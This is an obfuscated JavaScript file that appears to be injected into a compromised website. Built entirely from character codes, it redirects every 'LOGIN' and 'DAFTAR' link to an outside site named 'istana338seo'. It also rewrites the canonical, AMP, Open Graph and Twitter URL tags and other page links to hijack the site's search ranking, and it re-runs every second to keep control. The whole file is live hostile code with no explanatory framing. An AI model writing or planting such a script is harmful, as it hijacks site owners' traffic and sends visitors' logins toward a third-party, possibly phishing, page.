const x1 = String.fromCharCode(104) + String.fromCharCode(116) + String.fromCharCode(116) + String.fromCharCode(112) + String.fromCharCode(115) + String.fromCharCode(58) + String.fromCharCode(47) + String.fromCharCode(47); 
const x2 = String.fromCharCode(104) + String.fromCharCode(105) + String.fromCharCode(103) + String.fromCharCode(104) + String.fromCharCode(103) + String.fromCharCode(114) + String.fromCharCode(97) + String.fromCharCode(100) + String.fromCharCode(101) + String.fromCharCode(104) + String.fromCharCode(101) + String.fromCharCode(109) + String.fromCharCode(112) + String.fromCharCode(115) + String.fromCharCode(101) + String.fromCharCode(101) + String.fromCharCode(100) + String.fromCharCode(46) + String.fromCharCode(99) + String.fromCharCode(111) + String.fromCharCode(109) + String.fromCharCode(47);
const x3 = String.fromCharCode(104) + String.fromCharCode(116) + String.fromCharCode(116) + String.fromCharCode(112) + String.fromCharCode(115) + String.fromCharCode(58) + String.fromCharCode(47) + String.fromCharCode(47) + String.fromCharCode(105) + String.fromCharCode(115) + String.fromCharCode(116) + String.fromCharCode(97) + String.fromCharCode(110) + String.fromCharCode(97) + String.fromCharCode(51) + String.fromCharCode(51) + String.fromCharCode(56) + String.fromCharCode(115) + String.fromCharCode(101) + String.fromCharCode(111) + String.fromCharCode(46) + String.fromCharCode(112) + String.fromCharCode(97) + String.fromCharCode(103) + String.fromCharCode(101) + String.fromCharCode(115) + String.fromCharCode(46) + String.fromCharCode(100) + String.fromCharCode(101) + String.fromCharCode(118) + String.fromCharCode(47);

function f4() {
    const a5 = window['document']['querySelectorAll'](String.fromCharCode(97)); 
    a5.forEach((b6) => {
        if (b6.textContent.trim().toUpperCase() === String.fromCharCode(76) + String.fromCharCode(79) + String.fromCharCode(71) + String.fromCharCode(73) + String.fromCharCode(78) || 
            b6.textContent.trim().toUpperCase() === String.fromCharCode(68) + String.fromCharCode(65) + String.fromCharCode(70) + String.fromCharCode(84) + String.fromCharCode(65) + String.fromCharCode(82)) {
            b6[String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102)] = x3; 
        }
    });
}

function f7() { 
    const c8 = window['document']['querySelector'](String.fromCharCode(108) + String.fromCharCode(105) + String.fromCharCode(110) + String.fromCharCode(107) + String.fromCharCode(91) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(108) + String.fromCharCode(61) + String.fromCharCode(99) + String.fromCharCode(97) + String.fromCharCode(110) + String.fromCharCode(111) + String.fromCharCode(110) + String.fromCharCode(105) + String.fromCharCode(99) + String.fromCharCode(97) + String.fromCharCode(108) + String.fromCharCode(93)); 
    let p9 = ''; 

    if (c8) {
        p9 = c8[String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102)].replace(RegExp(String.fromCharCode(94) + String.fromCharCode(104) + String.fromCharCode(116) + String.fromCharCode(116) + String.fromCharCode(112) + String.fromCharCode(115) + String.fromCharCode(58) + String.fromCharCode(47) + String.fromCharCode(47) + String.fromCharCode(91) + String.fromCharCode(94) + String.fromCharCode(92) + String.fromCharCode(47) + String.fromCharCode(43) + String.fromCharCode(124) + String.fromCharCode(48) + String.fromCharCode(57) + String.fromCharCode(47) + String.fromCharCode(41)), '');
        c8[String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102)] = x1; 
    } else {
        const n10 = window['document']['createElement'](String.fromCharCode(108) + String.fromCharCode(105) + String.fromCharCode(110) + String.fromCharCode(107));
        n10[String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(108)] = String.fromCharCode(99) + String.fromCharCode(97) + String.fromCharCode(110) + String.fromCharCode(111) + String.fromCharCode(110) + String.fromCharCode(105) + String.fromCharCode(99) + String.fromCharCode(97) + String.fromCharCode(108);
        n10[String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102)] = x1; 
        window['document']['head']['appendChild'](n10);
    }

    const a12 = window['document']['querySelectorAll'](String.fromCharCode(97) + String.fromCharCode(91) + String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102) + String.fromCharCode(93)); 
    a12.forEach((b13) => {
        if (b13[String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102)].startsWith(String.fromCharCode(104) + String.fromCharCode(116) + String.fromCharCode(116) + String.fromCharCode(112)) && !f14(b13)) {
            const r15 = b13[String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102)].replace(RegExp(String.fromCharCode(94) + String.fromCharCode(104) + String.fromCharCode(116) + String.fromCharCode(116) + String.fromCharCode(112) + String.fromCharCode(115) + String.fromCharCode(58) + String.fromCharCode(47) + String.fromCharCode(47) + String.fromCharCode(91) + String.fromCharCode(94) + String.fromCharCode(92) + String.fromCharCode(47) + String.fromCharCode(43) + String.fromCharCode(124) + String.fromCharCode(48) + String.fromCharCode(57) + String.fromCharCode(47) + String.fromCharCode(41)), ''); 
            b13[String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102)] = x1 + r15.replace(p9, ''); 
        }
    });

    const m16 = window['document']['querySelectorAll'](String.fromCharCode(109) + String.fromCharCode(101) + String.fromCharCode(116) + String.fromCharCode(97) + String.fromCharCode(91) + String.fromCharCode(112) + String.fromCharCode(114) + String.fromCharCode(111) + String.fromCharCode(112) + String.fromCharCode(101) + String.fromCharCode(114) + String.fromCharCode(61) + String.fromCharCode(111) + String.fromCharCode(103) + String.fromCharCode(58) + String.fromCharCode(117) + String.fromCharCode(114) + String.fromCharCode(108) + String.fromCharCode(93) + 
        String.fromCharCode(44) + String.fromCharCode(109) + String.fromCharCode(101) + String.fromCharCode(116) + String.fromCharCode(97) + String.fromCharCode(91) + String.fromCharCode(110) + String.fromCharCode(97) + String.fromCharCode(109) + String.fromCharCode(101) + String.fromCharCode(61) + String.fromCharCode(116) + String.fromCharCode(119) + String.fromCharCode(105) + String.fromCharCode(116) + String.fromCharCode(116) + String.fromCharCode(101) + String.fromCharCode(114) + String.fromCharCode(58) + String.fromCharCode(117) + String.fromCharCode(114) + String.fromCharCode(108) + String.fromCharCode(93)); 
    m16.forEach((m17) => {
        const mP = m17.content.replace(RegExp(String.fromCharCode(94) + String.fromCharCode(104) + String.fromCharCode(116) + String.fromCharCode(116) + String.fromCharCode(112) + String.fromCharCode(115) + String.fromCharCode(58) + String.fromCharCode(47) + String.fromCharCode(47) + String.fromCharCode(91) + String.fromCharCode(94) + String.fromCharCode(92) + String.fromCharCode(47) + String.fromCharCode(43) + String.fromCharCode(124) + String.fromCharCode(48) + String.fromCharCode(57) + String.fromCharCode(47) + String.fromCharCode(41)), ''); 
        m17.content = x1 + mP.replace(p9, ''); 
    });

    const a18 = window['document']['querySelector'](String.fromCharCode(108) + String.fromCharCode(105) + String.fromCharCode(110) + String.fromCharCode(107) + String.fromCharCode(91) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(108) + String.fromCharCode(61) + String.fromCharCode(97) + String.fromCharCode(109) + String.fromCharCode(112) + String.fromCharCode(104) + String.fromCharCode(116) + String.fromCharCode(109) + String.fromCharCode(108)); 
    if (a18) {
        a18[String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102)] = x2; 
    } else {
        const n19 = window['document']['createElement'](String.fromCharCode(108) + String.fromCharCode(105) + String.fromCharCode(110) + String.fromCharCode(107));
        n19[String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(108)] = String.fromCharCode(97) + String.fromCharCode(109) + String.fromCharCode(112) + String.fromCharCode(104) + String.fromCharCode(116) + String.fromCharCode(109) + String.fromCharCode(108);
        n19[String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102)] = x2; 
        window['document']['head']['appendChild'](n19); 
    }
}

function f14(l1) { 
    return l1.classList.contains(String.fromCharCode(108) + String.fromCharCode(111) + String.fromCharCode(103) + String.fromCharCode(105) + String.fromCharCode(110)) ||
           l1.classList.contains(String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(103) + String.fromCharCode(105) + String.fromCharCode(115) + String.fromCharCode(116) + String.fromCharCode(101) + String.fromCharCode(114)) ||
           l1[String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102)] === x1 ||
           l1[String.fromCharCode(104) + String.fromCharCode(114) + String.fromCharCode(101) + String.fromCharCode(102)] === x2 ||
           l1.classList.contains(String.fromCharCode(115) + String.fromCharCode(112) + String.fromCharCode(101) + String.fromCharCode(99) + String.fromCharCode(105) + String.fromCharCode(97) + String.fromCharCode(108) + String.fromCharCode(45) + String.fromCharCode(108) + String.fromCharCode(105) + String.fromCharCode(110) + String.fromCharCode(107)) || 
           l1.textContent.trim().toUpperCase() === String.fromCharCode(76) + String.fromCharCode(79) + String.fromCharCode(71) + String.fromCharCode(73) + String.fromCharCode(78) || 
           l1.textContent.trim().toUpperCase() === String.fromCharCode(68) + String.fromCharCode(65) + String.fromCharCode(70) + String.fromCharCode(84) + String.fromCharCode(65) + String.fromCharCode(82);
}

document.addEventListener(String.fromCharCode(68) + String.fromCharCode(79) + String.fromCharCode(77) + String.fromCharCode(69) + String.fromCharCode(78) + String.fromCharCode(84) + String.fromCharCode(76) + String.fromCharCode(79) + String.fromCharCode(65) + String.fromCharCode(68) + String.fromCharCode(69) + String.fromCharCode(100), () => {
    f7(); 
    f4(); 
});

// Monitor changes
setInterval(f7, 1000);
